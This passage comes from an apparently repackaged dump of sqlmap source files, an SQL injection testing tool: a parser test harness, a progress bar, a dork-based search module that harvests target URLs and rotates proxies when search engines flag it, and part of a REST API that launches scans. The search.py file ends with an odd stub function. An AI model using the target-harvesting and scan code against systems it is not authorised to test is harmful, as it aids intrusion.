instruction, could be overridden\n    def handle_pi(self, data):\n        pass\n\n    # To be overridden -- handlers for unknown objects\n    def unknown_starttag(self, tag, attrs):\n        pass\n\n    def unknown_endtag(self, tag):\n        pass\n\n    def unknown_charref(self, ref):\n        pass\n\n    def unknown_entityref(self, ref):\n        pass\n\n\nclass TestSGMLParser(SGMLParser):\n\n    def __init__(self, verbose=0):\n        self.testdata = \"\"\n        SGMLParser.__init__(self, verbose)\n\n    def handle_data(self, data):\n        self.testdata = self.testdata + data\n        if len(repr(self.testdata)) >= 70:\n            self.flush()\n\n    def flush(self):\n        data = self.testdata\n        if data:\n            self.testdata = \"\"\n            print('data:', repr(data))\n\n    def handle_comment(self, data):\n        self.flush()\n        r = repr(data)\n        if len(r) > 68:\n            r = r[:32] + '...' + r[-32:]\n        print('comment:', r)\n\n    def unknown_starttag(self, tag, attrs):\n        self.flush()\n        if not attrs:\n            print('start tag: <' + tag + '>')\n        else:\n            print('start tag: <' + tag, end=' ')\n            for name, value in attrs:\n                print(name + '=' + '\"' + value + '\"', end=' ')\n            print('>')\n\n    def unknown_endtag(self, tag):\n        self.flush()\n        print('end tag: </' + tag + '>')\n\n    def unknown_entityref(self, ref):\n        self.flush()\n        print('*** unknown entity ref: &' + ref + ';')\n\n    def unknown_charref(self, ref):\n        self.flush()\n        print('*** unknown char ref: &#' + ref + ';')\n\n    def unknown_decl(self, data):\n        self.flush()\n        print('*** unknown decl: [' + data + ']')\n\n    def close(self):\n        SGMLParser.close(self)\n        self.flush()\n\n\ndef test(args=None):\n    import sys\n\n    if args is None:\n        args = sys.argv[1:]\n\n    if args and args[0] == '-s':\n        args = args[1:]\n        klass = SGMLParser\n    else:\n        klass = TestSGMLParser\n\n    if args:\n        file = args[0]\n    else:\n        file = 'test.html'\n\n    if file == '-':\n        f = sys.stdin\n    else:\n        try:\n            f = open(file, 'r')\n        except IOError as msg:\n            print(file, \":\", msg)\n            sys.exit(1)\n\n    data = f.read()\n    if f is not sys.stdin:\n        f.close()\n\n    x = klass()\n    for c in data:\n        x.feed(c)\n    x.close()\n\n\nif __name__ == '__main__':\n    test()\n", "lib/utils/progress.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import division\n\nimport time\n\nfrom lib.core.common import dataToStdout\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\n\nclass ProgressBar(object):\n    \"\"\"\n    This class defines methods to update and draw a progress bar\n    \"\"\"\n\n    def __init__(self, minValue=0, maxValue=10, totalWidth=None):\n        self._progBar = \"[]\"\n        self._min = int(minValue)\n        self._max = int(maxValue)\n        self._span = max(self._max - self._min, 0.001)\n        self._width = totalWidth if totalWidth else conf.progressWidth\n        self._amount = 0\n        self._start = None\n        self.update()\n\n    def _convertSeconds(self, value):\n        seconds = value\n        minutes = seconds // 60\n        seconds = seconds - (minutes * 60)\n\n        return \"%.2d:%.2d\" % (minutes, seconds)\n\n    def update(self, newAmount=0):\n        \"\"\"\n        This method updates the progress bar\n        \"\"\"\n\n        if newAmount < self._min:\n            newAmount = self._min\n        elif newAmount > self._max:\n            newAmount = self._max\n\n        self._amount = newAmount\n\n        # Figure out the new percent done, round to an integer\n        diffFromMin = float(self._amount - self._min)\n        percentDone = (diffFromMin / float(self._span)) * 100.0\n        percentDone = round(percentDone)\n        percentDone = min(100, int(percentDone))\n\n        # Figure out how many hash bars the percentage should be\n        allFull = self._width - len(\"100%% [] %s/%s  (ETA 00:00)\" % (self._max, self._max))\n        numHashes = (percentDone / 100.0) * allFull\n        numHashes = int(round(numHashes))\n\n        # Build a progress bar with an arrow of equal signs\n        if numHashes == 0:\n            self._progBar = \"[>%s]\" % (\" \" * (allFull - 1))\n        elif numHashes == allFull:\n            self._progBar = \"[%s]\" % (\"=\" * allFull)\n        else:\n            self._progBar = \"[%s>%s]\" % (\"=\" * (numHashes - 1), \" \" * (allFull - numHashes))\n\n        # Add the percentage at the beginning of the progress bar\n        percentString = getUnicode(percentDone) + \"%\"\n        self._progBar = \"%s %s\" % (percentString, self._progBar)\n\n    def progress(self, newAmount):\n        \"\"\"\n        This method saves item delta time and shows updated progress bar with calculated eta\n        \"\"\"\n\n        if self._start is None or newAmount > self._max:\n            self._start = time.time()\n            eta = None\n        else:\n            delta = time.time() - self._start\n            eta = (self._max - self._min) * (1.0 * delta / newAmount) - delta\n\n        self.update(newAmount)\n        self.draw(eta)\n\n    def draw(self, eta=None):\n        \"\"\"\n        This method draws the progress bar if it has changed\n        \"\"\"\n\n        dataToStdout(\"\\r%s %d/%d%s\" % (self._progBar, self._amount, self._max, (\"  (ETA %s)\" % (self._convertSeconds(int(eta)) if eta is not None else \"??:??\"))))\n        if self._amount >= self._max:\n            dataToStdout(\"\\r%s\\r\" % (\" \" * self._width))\n            kb.prependFlag = False\n\n    def __str__(self):\n        \"\"\"\n        This method returns the progress bar string\n        \"\"\"\n\n        return getUnicode(self._progBar)\n", "lib/utils/search.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport re\nimport socket\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import popValue\nfrom lib.core.common import pushValue\nfrom lib.core.common import readInput\nfrom lib.core.common import urlencode\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getUnicode\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.decorators import stackedmethod\nfrom lib.core.enums import CUSTOM_LOGGING\nfrom lib.core.enums import HTTP_HEADER\nfrom lib.core.enums import REDIRECTION\nfrom lib.core.exception import SqlmapBaseException\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.exception import SqlmapUserQuitException\nfrom lib.core.settings import BING_REGEX\nfrom lib.core.settings import DUCKDUCKGO_REGEX\nfrom lib.core.settings import DUMMY_SEARCH_USER_AGENT\nfrom lib.core.settings import GOOGLE_CONSENT_COOKIE\nfrom lib.core.settings import GOOGLE_REGEX\nfrom lib.core.settings import HTTP_ACCEPT_ENCODING_HEADER_VALUE\nfrom lib.core.settings import UNICODE_ENCODING\nfrom lib.request.basic import decodePage\nfrom thirdparty.six.moves import http_client as _http_client\nfrom thirdparty.six.moves import urllib as _urllib\nfrom thirdparty.socks import socks\n\ndef _search(dork):\n    \"\"\"\n    This method performs the effective search on Google providing\n    the google dork and the Google session cookie\n    \"\"\"\n\n    if not dork:\n        return None\n\n    page = None\n    data = None\n    requestHeaders = {}\n    responseHeaders = {}\n\n    requestHeaders[HTTP_HEADER.USER_AGENT] = dict(conf.httpHeaders).get(HTTP_HEADER.USER_AGENT, DUMMY_SEARCH_USER_AGENT)\n    requestHeaders[HTTP_HEADER.ACCEPT_ENCODING] = HTTP_ACCEPT_ENCODING_HEADER_VALUE\n    requestHeaders[HTTP_HEADER.COOKIE] = GOOGLE_CONSENT_COOKIE\n\n    try:\n        req = _urllib.request.Request(\"https://www.google.com/ncr\", headers=requestHeaders)\n        conn = _urllib.request.urlopen(req)\n    except Exception as ex:\n        errMsg = \"unable to connect to Google ('%s')\" % getSafeExString(ex)\n        raise SqlmapConnectionException(errMsg)\n\n    gpage = conf.googlePage if conf.googlePage > 1 else 1\n    logger.info(\"using search result page #%d\" % gpage)\n\n    url = \"https://www.google.com/search?\"                                  # NOTE: if consent fails, try to use the \"http://\"\n    url += \"q=%s&\" % urlencode(dork, convall=True)\n    url += \"num=100&hl=en&complete=0&safe=off&filter=0&btnG=Search\"\n    url += \"&start=%d\" % ((gpage - 1) * 100)\n\n    try:\n        req = _urllib.request.Request(url, headers=requestHeaders)\n        conn = _urllib.request.urlopen(req)\n\n        requestMsg = \"HTTP request:\\nGET %s\" % url\n        requestMsg += \" %s\" % _http_client.HTTPConnection._http_vsn_str\n        logger.log(CUSTOM_LOGGING.TRAFFIC_OUT, requestMsg)\n\n        page = conn.read()\n        code = conn.code\n        status = conn.msg\n        responseHeaders = conn.info()\n\n        responseMsg = \"HTTP response (%s - %d):\\n\" % (status, code)\n\n        if conf.verbose <= 4:\n            responseMsg += getUnicode(responseHeaders, UNICODE_ENCODING)\n        elif conf.verbose > 4:\n            responseMsg += \"%s\\n%s\\n\" % (responseHeaders, page)\n\n        logger.log(CUSTOM_LOGGING.TRAFFIC_IN, responseMsg)\n    except _urllib.error.HTTPError as ex:\n        try:\n            page = ex.read()\n            responseHeaders = ex.info()\n        except Exception as _:\n            warnMsg = \"problem occurred while trying to get \"\n            warnMsg += \"an error page information (%s)\" % getSafeExString(_)\n            logger.critical(warnMsg)\n            return None\n    except (_urllib.error.URLError, _http_client.error, socket.error, socket.timeout, socks.ProxyError):\n        errMsg = \"unable to connect to Google\"\n        raise SqlmapConnectionException(errMsg)\n\n    page = decodePage(page, responseHeaders.get(HTTP_HEADER.CONTENT_ENCODING), responseHeaders.get(HTTP_HEADER.CONTENT_TYPE))\n\n    page = getUnicode(page)  # Note: if decodePage call fails (Issue #4202)\n\n    retVal = [_urllib.parse.unquote(match.group(1) or match.group(2)) for match in re.finditer(GOOGLE_REGEX, page, re.I)]\n\n    if not retVal and \"detected unusual traffic\" in page:\n        warnMsg = \"Google has detected 'unusual' traffic from \"\n        warnMsg += \"used IP address disabling further searches\"\n\n        if conf.proxyList:\n            raise SqlmapBaseException(warnMsg)\n        else:\n            logger.critical(warnMsg)\n\n    if not retVal:\n        message = \"no usable links found. What do you want to do?\"\n        message += \"\\n[1] (re)try with DuckDuckGo (default)\"\n        message += \"\\n[2] (re)try with Bing\"\n        message += \"\\n[3] quit\"\n        choice = readInput(message, default='1')\n\n        if choice == '3':\n            raise SqlmapUserQuitException\n        elif choice == '2':\n            url = \"https://www.bing.com/search?q=%s&first=%d\" % (urlencode(dork, convall=True), (gpage - 1) * 10 + 1)\n            regex = BING_REGEX\n        else:\n            url = \"https://html.duckduckgo.com/html/\"\n            data = \"q=%s&s=%d\" % (urlencode(dork, convall=True), (gpage - 1) * 30)\n            regex = DUCKDUCKGO_REGEX\n\n        try:\n            req = _urllib.request.Request(url, data=getBytes(data), headers=requestHeaders)\n            conn = _urllib.request.urlopen(req)\n\n            requestMsg = \"HTTP request:\\nGET %s\" % url\n            requestMsg += \" %s\" % _http_client.HTTPConnection._http_vsn_str\n            logger.log(CUSTOM_LOGGING.TRAFFIC_OUT, requestMsg)\n\n            page = conn.read()\n            code = conn.code\n            status = conn.msg\n            responseHeaders = conn.info()\n            page = decodePage(page, responseHeaders.get(\"Content-Encoding\"), responseHeaders.get(\"Content-Type\"))\n\n            responseMsg = \"HTTP response (%s - %d):\\n\" % (status, code)\n\n            if conf.verbose <= 4:\n                responseMsg += getUnicode(responseHeaders, UNICODE_ENCODING)\n            elif conf.verbose > 4:\n                responseMsg += \"%s\\n%s\\n\" % (responseHeaders, page)\n\n            logger.log(CUSTOM_LOGGING.TRAFFIC_IN, responseMsg)\n        except _urllib.error.HTTPError as ex:\n            try:\n                page = ex.read()\n                page = decodePage(page, ex.headers.get(\"Content-Encoding\"), ex.headers.get(\"Content-Type\"))\n            except socket.timeout:\n                warnMsg = \"connection timed out while trying \"\n                warnMsg += \"to get error page information (%d)\" % ex.code\n                logger.critical(warnMsg)\n                return None\n        except:\n            errMsg = \"unable to connect\"\n            raise SqlmapConnectionException(errMsg)\n\n        page = getUnicode(page)  # Note: if decodePage call fails (Issue #4202)\n\n        retVal = [_urllib.parse.unquote(match.group(1).replace(\"&amp;\", \"&\")) for match in re.finditer(regex, page, re.I | re.S)]\n\n        if not retVal and \"issue with the Tor Exit Node you are currently using\" in page:\n            warnMsg = \"DuckDuckGo has detected 'unusual' traffic from \"\n            warnMsg += \"used (Tor) IP address\"\n\n            if conf.proxyList:\n                raise SqlmapBaseException(warnMsg)\n            else:\n                logger.critical(warnMsg)\n\n    return retVal\n\n@stackedmethod\ndef search(dork):\n    pushValue(kb.choices.redirect)\n    kb.choices.redirect = REDIRECTION.YES\n\n    try:\n        return _search(dork)\n    except SqlmapBaseException as ex:\n        if conf.proxyList:\n            logger.critical(getSafeExString(ex))\n\n            warnMsg = \"changing proxy\"\n            logger.warning(warnMsg)\n\n            conf.proxy = None\n\n            setHTTPHandlers()\n            return search(dork)\n        else:\n            raise\n    finally:\n        kb.choices.redirect = popValue()\n\ndef setHTTPHandlers():  # Cross-referenced function\n    raise NotImplementedError\n", "lib/utils/api.py": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom __future__ import print_function\n\nimport contextlib\nimport logging\nimport os\nimport re\nimport shlex\nimport socket\nimport sqlite3\nimport sys\nimport tempfile\nimport threading\nimport time\n\nfrom lib.core.common import dataToStdout\nfrom lib.core.common import getSafeExString\nfrom lib.core.common import openFile\nfrom lib.core.common import saveConfig\nfrom lib.core.common import setColor\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.compat import xrange\nfrom lib.core.convert import decodeBase64\nfrom lib.core.convert import dejsonize\nfrom lib.core.convert import encodeBase64\nfrom lib.core.convert import encodeHex\nfrom lib.core.convert import getBytes\nfrom lib.core.convert import getText\nfrom lib.core.convert import jsonize\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.datatype import AttribDict\nfrom lib.core.defaults import _defaults\nfrom lib.core.dicts import PART_RUN_CONTENT_TYPES\nfrom lib.core.enums import AUTOCOMPLETE_TYPE\nfrom lib.core.enums import CONTENT_STATUS\nfrom lib.core.enums import MKSTEMP_PREFIX\nfrom lib.core.exception import SqlmapConnectionException\nfrom lib.core.log import LOGGER_HANDLER\nfrom lib.core.optiondict import optDict\nfrom lib.core.settings import IS_WIN\nfrom lib.core.settings import RESTAPI_DEFAULT_ADAPTER\nfrom lib.core.settings import RESTAPI_DEFAULT_ADDRESS\nfrom lib.core.settings import RESTAPI_DEFAULT_PORT\nfrom lib.core.settings import RESTAPI_UNSUPPORTED_OPTIONS\nfrom lib.core.settings import VERSION_STRING\nfrom lib.core.shell import autoCompletion\nfrom lib.core.subprocessng import Popen\nfrom lib.parse.cmdline import cmdLineParser\nfrom thirdparty.bottle.bottle import error as return_error\nfrom thirdparty.bottle.bottle import get\nfrom thirdparty.bottle.bottle import hook\nfrom thirdparty.bottle.bottle import post\nfrom thirdparty.bottle.bottle import request\nfrom thirdparty.bottle.bottle import response\nfrom thirdparty.bottle.bottle import run\nfrom thirdparty.bottle.bottle import server_names\nfrom thirdparty import six\nfrom thirdparty.six.moves import http_client as _http_client\nfrom thirdparty.six.moves import input as _input\nfrom thirdparty.six.moves import urllib as _urllib\n\n# Global data storage\nclass DataStore(object):\n    admin_token = \"\"\n    current_db = None\n    tasks = dict()\n    username = None\n    password = None\n\n# API objects\nclass Database(object):\n    filepath = None\n\n    def __init__(self, database=None):\n        self.database = self.filepath if database is None else database\n        self.connection = None\n        self.cursor = None\n\n    def connect(self, who=\"server\"):\n        self.connection = sqlite3.connect(self.database, timeout=3, isolation_level=None, check_same_thread=False)\n        self.cursor = self.connection.cursor()\n        self.lock = threading.Lock()\n        logger.debug(\"REST-JSON API %s connected to IPC database\" % who)\n\n    def disconnect(self):\n        if self.cursor:\n            self.cursor.close()\n\n        if self.connection:\n            self.connection.close()\n\n    def commit(self):\n        self.connection.commit()\n\n    def execute(self, statement, arguments=None):\n        with self.lock:\n            while True:\n                try:\n                    if arguments:\n                        self.cursor.execute(statement, arguments)\n                    else:\n                        self.cursor.execute(statement)\n                except sqlite3.OperationalError as ex:\n                    if \"locked\" not in getSafeExString(ex):\n                        raise\n                    else:\n                        time.sleep(1)\n                else:\n                    break\n\n        if statement.lstrip().upper().startswith(\"SELECT\"):\n            return self.cursor.fetchall()\n\n    def init(self):\n        self.execute(\"CREATE TABLE IF NOT EXISTS logs(id INTEGER PRIMARY KEY AUTOINCREMENT, taskid INTEGER, time TEXT, level TEXT, message TEXT)\")\n        self.execute(\"CREATE TABLE IF NOT EXISTS data(id INTEGER PRIMARY KEY AUTOINCREMENT, taskid INTEGER, status INTEGER, content_type INTEGER, value TEXT)\")\n        self.execute(\"CREATE TABLE IF NOT EXISTS errors(id INTEGER PRIMARY KEY AUTOINCREMENT, taskid INTEGER, error TEXT)\")\n\nclass Task(object):\n    def __init__(self, taskid, remote_addr):\n        self.remote_addr = remote_addr\n        self.process = None\n        self.output_directory = None\n        self.options = None\n        self._original_options = None\n        self.initialize_options(taskid)\n\n    def initialize_options(self, taskid):\n        datatype = {\"boolean\": False, \"string\": None, \"integer\": None, \"float\": None}\n        self.options = AttribDict()\n\n        for _ in optDict:\n            for name, type_ in optDict[_].items():\n                type_ = unArrayizeValue(type_)\n                self.options[name] = _defaults.get(name, datatype[type_])\n\n        # Let sqlmap engine knows it is getting called by the API,\n        # the task ID and the file path of the IPC database\n        self.options.api = True\n        self.options.taskid = taskid\n        self.options.database = Database.filepath\n\n        # Enforce batch mode and disable coloring and ETA\n        self.options.batch = True\n        self.options.disableColoring = True\n        self.options.eta = False\n\n        self._original_options = AttribDict(self.options)\n\n    def set_option(self, option, value):\n        self.options[option] = value\n\n    def get_option(self, option):\n        return self.options[option]\n\n    def get_options(self):\n        return self.options\n\n    def reset_options(self):\n        self.options = AttribDict(self._original_options)\n\n    def engine_start(self):\n        handle, configFile = tempfile.mkstemp(prefix=MKSTEMP_PREFIX.CONFIG, text=True)\n        os.close(handle)\n        saveConfig(self.options, configFile)\n\n        if os.path.exists(\"sqlmap.py\"):\n            self.process = Popen([sys.executable or \"python\", \"sqlmap.py\", \"--api\", \"-c\", configFile], shell=False, close_fds=not IS_WIN)\n        elif os.path.exists(os.path.join(os.getcwd(), \"sqlmap.py\")):\n            self.process = Popen([sys.executable or \"python\", \"sqlmap.py\", \"--api\", \"-c\", configFile], shell=False, cwd=os.getcwd(), close_fds=not IS_WIN)\n        elif os.path.exists(os.path.join(os.path.abspath(os.path.dirname(sys.argv[0])), \"sqlmap.py\")):\n            self.process = Popen([sys.executable or \"python\", \"sqlmap.py\", \"--api\", \"-c\", configFile], shell=False, cwd=os.path.join(os.path.abspath(os.path.dirname(sys.argv[0]))), close_fds=not IS_WIN)\n        else:\n            self.process = Popen([\"sqlmap\", \"--api\", \"-c\", configFile], shell=False, close_fds=not IS_WIN)\n\n    def engine_stop(self):\n        if self.process:\n            self.process.terminate()\n            return self.process.wait()\n        else:\n            return None\n\n    def engine_process(self):\n        return self.process\n\n    def engine_kill(self):\n        if self.process:\n            try:\n                self.process.kill()\n                return self.process.wait()\n            except:\n                pass\n        return None\n\n    def engine_get_id(self):\n        if self.process:\n            return self.process.pid\n        else:\n            return None\n\n    def engine_get_returncode(self):\n        if self.process:\n            self.process.poll()\n            return self.process.returncode\n        else:\n            return None\n\n    def engine_has_terminated(self):\n        return isinstance(self.engine_get_returncode(), int)\n\n# Wrapper functions for sqlmap engine\nclass StdDbOut(object):\n    def __init__(self, taskid, messagetype=\"stdout\"):\n        # Overwrite system standard output and standard error to write\n        # to an IPC database\n        self.messagetype = messagetype\n        self.taskid = taskid\n\n        if self.messagetype == \"stdout\":\n            sys.stdout = self\n        else:\n            sys.stderr = self\n\n    def write(self, value, status=CONTENT_STATUS.IN_PROGRESS, content_type=None):\n        if self.messagetype == \"stdout\":\n            if content_type is None:\n                if kb.partRun is not None:\n                    content_type = PART_RUN_CONTENT_TYPES.get(kb.partRun)\n                else:\n                    # Ignore all non-relevant messages\n                    return\n\n            output = conf.databaseCursor.execute(\"SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?\", (self.taskid, content_type))\n\n            # Delete partial output from IPC database if we have got a complete output\n            if status == CONTENT_STATUS.COMPLETE:\n                if len(output) > 0:\n                    for index in xrange(len(output)):\n                        conf.databaseCursor.execute(\"DELETE FROM data WHERE id = ?\", (output[index][0],))\n\n                conf.databaseCursor.execute(\"INSERT INTO data VALUES(NULL, ?, ?, ?, ?)\", (self.taskid, status, content_type, jsonize(value)))\n                if kb.partRun:\n                    kb.partRun = None\n\n            elif status == CONTENT_STATUS.IN_PROGRESS:\n                if len(output) == 0:\n                    conf.databaseCursor.execute(\"INSERT INTO data VALUES(NULL, ?, ?, ?, ?)\", (self.taskid, status, content_type, jsonize(value)))\n                else:\n                    new_value = \"%s%s\" % (dejsonize(output[0][2]), value)\n                    conf.databaseCursor.execute(\"UPDATE data SET value = ? WHERE id = ?\", (jsonize(new_value), output[0][0]))\n        else:\n            conf.databaseCursor.execute(\"INSERT INTO errors VALUES(NULL, ?, ?)\", (self.taskid, str(value) if value else \"\"))\n\n    def flush(self):\n        pass\n\n    def close(self):\n        pass\n\n    def seek(self):\n        pass\n\nclass LogRecorder(logging.StreamHandler):\n    def emit(self, record):\n        \"\"\"\n        Record emitted events to IPC database for asynchronous I/O\n        communication with the parent process\n        \"\"\"\n        conf.databaseCursor.execute(\"INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)\", (conf.taskid, time.strftime(\"%X\"), record.levelname, str(record.msg % record.args if record.args else record.msg)))\n\ndef setRestAPILog():\n    if conf.api:\n        try:\n            conf.databaseCursor = Database(conf.database)\n            conf.databaseCursor.connect(\"client\")\n        except sqlite3.OperationalError as ex:\n            raise SqlmapConnectionException(\"%s ('%s')\" % (ex, conf.database))\n\n        # Set a logging handler that writes log messages to a IPC database\n        logger.removeHandler(LOGGER_HANDLER)\n        LOGGER_RECORDER = LogRecorder()\n        logger.addHandler(LOGGER_RECORDER)\n\n# Generic functions\ndef is_admin(token):\n    return DataStore.admin_token == token\n\n@hook('before_request')\ndef check_authentication():\n    if not any((DataStore.username, DataStore.password)):\n        return\n\n    authorization = request.headers.get(\"Authorization\", \"\")\n    match = re.search(r\"(?i)\\ABasic\\s+([^\\s]+)\", authorization)\n\n    if not match:\n        request.environ[\"PATH_INFO\"] = \"/error/401\"\n\n    try:\n        creds = decodeBase64(match.group(1), binary=False)\n    except:\n        request.environ[\"PATH_INFO\"] = \"/error/401\"\n    else:\n        if creds.count(':') != 1:\n            request.environ[\"PATH_INFO\"] = \"/error/401\"\n        else:\n            username, password = creds.split(':')\n            if username.strip() != (DataStore.username or \"\") or password.strip() != (DataStore.password or \"\"):\n                request.environ[\"PATH_INFO\"] = \"/error/401\"\n\n@hook(\"after_request\")\ndef security_headers(json_header=True):\n    \"\"\"\n    Set some headers across all HTTP responses\n    \"\"\"\n    response.headers[\"Server\"] = \"Server\"\n    response.headers[\"X-Content-Type-Options\"] = \"nosniff\"\n    response.headers[\"X-Frame-Options\"] = \"DENY\"\n    response.headers[\"X-XSS-Protection\"] = \"1; mode=block\"\n    response.headers[\"Pragma\"] = \"no-cache\"\n    response.headers[\"Cache-Control\"] = \"no-cache\"\n    response.headers[\"Expires\"] = \"0\"\n\n    if json_header:\n        response.content_type = \"application/json; charset=UTF-8\"\n\n##############################\n# HTTP Status Code functions #\n##############################\n\n@return_error(401)  # Access Denied\ndef error401(error=None):\n    security_headers(False)\n    return \"Access denied\"\n\n@return_error(404)  # Not Found\ndef error404(error=None):\n    security_headers(False)\n    return \"Nothing here\"\n\n@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)\ndef error405(error=None):\n    security_headers(False)\n    return \"Method not allowed\"\n\n@return_error(500)  # Internal Server Error\ndef error500(error=None):\n    security_headers(False)\n    return \"Internal server error\"\n\n#############\n# Auxiliary #\n#############\n\n@get('/error/401')\ndef path_401():\n    response.status = 401\n    return response\n\n#############################\n# Task management functions #\n#############################\n\n# Users' methods\n@get(\"/task/new\")\ndef task_new():\n    \"\"\"\n    Create a new task\n    \"\"\"\n    taskid = encodeHex(os.urandom(8), binary=False)\n    remote_addr = request.remote_addr\n\n    DataStore.tasks[taskid] = Task(taskid, remote_addr)\n\n    logger.debug(\"Created new task: '%s'\" % taskid)\n    return jsonize({\"success\": True, \"taskid\": taskid})\n\n@get(\"/task/<taskid>/delete\")\ndef task_delete(taskid):\n    \"\"\"\n    Delete an existing task\n    \"\"\"\n    if taskid in DataStore.tasks:\n        DataStore.tasks.pop(taskid)\n\n        logger.debug(\"(%s) Deleted task\" % taskid)\n        return jsonize({\"success\": True})\n    else:\n        response.status = 404\n        logger.warning(\"[%s] Non-existing task ID provided to task_delete()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Non-existing task ID\"})\n\n###################\n# Admin functions #\n###################\n\n@get(\"/admin/list\")\n@get(\"/admin/<token>/list\")\ndef task_list(token=None):\n    \"\"\"\n    Pull task list\n    \"\"\"\n    tasks = {}\n\n    for key in DataStore.tasks:\n        if is_admin(token) or DataStore.tasks[key].remote_addr == request.remote_addr:\n            tasks[key] = dejsonize(scan_status(key))[\"status\"]\n\n    logger.debug(\"(%s) Listed task pool (%s)\" % (token, \"admin\" if is_admin(token) else request.remote_addr))\n    return jsonize({\"success\": True, \"tasks\": tasks, \"tasks_num\": len(tasks)})\n\n@get(\"/admin/flush\")\n@get(\"/admin/<token>/flush\")\ndef task_flush(token=None):\n    \"\"\"\n    Flush task spool (delete all tasks)\n    \"\"\"\n\n    for key in list(DataStore.tasks):\n        if is_admin(token) or DataStore.tasks[key].remote_addr == request.remote_addr:\n            DataStore.tasks[key].engine_kill()\n            del DataStore.tasks[key]\n\n    logger.debug(\"(%s) Flushed task pool (%s)\" % (token, \"admin\" if is_admin(token) else request.remote_addr))\n    return jsonize({\"success\": True})\n\n##################################\n# sqlmap core interact functions #\n##################################\n\n# Handle task's options\n@get(\"/option/<taskid>/list\")\ndef option_list(taskid):\n    \"\"\"\n    List options for a certain task ID\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_list()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    logger.debug(\"(%s) Listed task options\" % taskid)\n    return jsonize({\"success\": True, \"options\": DataStore.tasks[taskid].get_options()})\n\n@post(\"/option/<taskid>/get\")\ndef option_get(taskid):\n    \"\"\"\n    Get value of option(s) for a certain task ID\n    \"\"\"\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_get()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    options = request.json or []\n    results = {}\n\n    for option in options:\n        if option in DataStore.tasks[taskid].options:\n            results[option] = DataStore.tasks[taskid].options[option]\n        else:\n            logger.debug(\"(%s) Requested value for unknown option '%s'\" % (taskid, option))\n            return jsonize({\"success\": False, \"message\": \"Unknown option '%s'\" % option})\n\n    logger.debug(\"(%s) Retrieved values for option(s) '%s'\" % (taskid, ','.join(options)))\n\n    return jsonize({\"success\": True, \"options\": results})\n\n@post(\"/option/<taskid>/set\")\ndef option_set(taskid):\n    \"\"\"\n    Set value of option(s) for a certain task ID\n    \"\"\"\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to option_set()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    if request.json is None:\n        logger.warning(\"[%s] Invalid JSON options provided to option_set()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid JSON options\"})\n\n    for option, value in request.json.items():\n        DataStore.tasks[taskid].set_option(option, value)\n\n    logger.debug(\"(%s) Requested to set options\" % taskid)\n    return jsonize({\"success\": True})\n\n# Handle scans\n@post(\"/scan/<taskid>/start\")\ndef scan_start(taskid):\n    \"\"\"\n    Launch a scan\n    \"\"\"\n\n    if taskid not in DataStore.tasks:\n        logger.warning(\"[%s] Invalid task ID provided to scan_start()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    if request.json is None:\n        logger.warning(\"[%s] Invalid JSON options provided to scan_start()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid JSON options\"})\n\n    for key in request.json:\n        if key in RESTAPI_UNSUPPORTED_OPTIONS:\n            logger.warning(\"[%s] Unsupported option '%s' provided to scan_start()\" % (taskid, key))\n            return jsonize({\"success\": False, \"message\": \"Unsupported option '%s'\" % key})\n\n    # Initialize sqlmap engine's options with user's provided options, if any\n    for option, value in request.json.items():\n        DataStore.tasks[taskid].set_option(option, value)\n\n    # Launch sqlmap engine in a separate process\n    DataStore.tasks[taskid].engine_start()\n\n    logger.debug(\"(%s) Started scan\" % taskid)\n    return jsonize({\"success\": True, \"engineid\": DataStore.tasks[taskid].engine_get_id()})\n\n@get(\"/scan/<taskid>/stop\")\ndef scan_stop(taskid):\n    \"\"\"\n    Stop a scan\n    \"\"\"\n\n    if (taskid not in DataStore.tasks or DataStore.tasks[taskid].engine_process() is None or DataStore.tasks[taskid].engine_has_terminated()):\n        logger.warning(\"[%s] Invalid task ID provided to scan_stop()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    DataStore.tasks[taskid].engine_stop()\n\n    logger.debug(\"(%s) Stopped scan\" % taskid)\n    return jsonize({\"success\": True})\n\n@get(\"/scan/<taskid>/kill\")\ndef scan_kill(taskid):\n    \"\"\"\n    Kill a scan\n    \"\"\"\n\n    if (taskid not in DataStore.tasks or DataStore.tasks[taskid].engine_process() is None or DataStore.tasks[taskid].engine_has_terminated()):\n        logger.warning(\"[%s] Invalid task ID provided to scan_kill()\" % taskid)\n        return jsonize({\"success\": False, \"message\": \"Invalid task ID\"})\n\n    DataStore.tasks[taskid].engine_kill()\n\n    logger.debug(\"(%s) Killed scan\" % taskid)\n    return jsonize({\"success\": True})\n\n@get(\"/scan/<taskid>/status\")\ndef scan_status(taskid):\n    \"\"\"\n    Returns status of a 